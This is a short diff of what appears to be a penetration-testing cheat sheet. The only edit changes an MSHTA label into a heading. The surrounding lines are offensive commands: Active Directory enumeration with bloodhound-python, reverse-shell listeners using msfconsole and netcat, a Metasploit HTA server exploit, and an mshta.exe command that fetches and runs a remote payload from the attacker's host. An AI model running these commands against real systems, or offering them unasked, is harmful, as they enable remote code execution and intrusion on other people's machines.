@@ -156,7 +156,7 @@ bloodhound-python -c default -u '$USERNAME' -p '$PASSWORD' -d "$DOM" -dc "$DC" -
 rlwrap msfconsole -q -x "use multi/handler; set LHOST $MYIP; set LPORT 4444; run"
 rlwrap nc -lvnp 4444
 
-[*] MSHTA
+## MSHTA
 rlwrap msfconsole -q -x "use exploit/windows/misc/hta_server; set LHOST $MYIP; set SRVHOST $MYIP; run"
 mshta.exe http://$MYIP:8080/nZzLAD.hta
 sessions -i 1
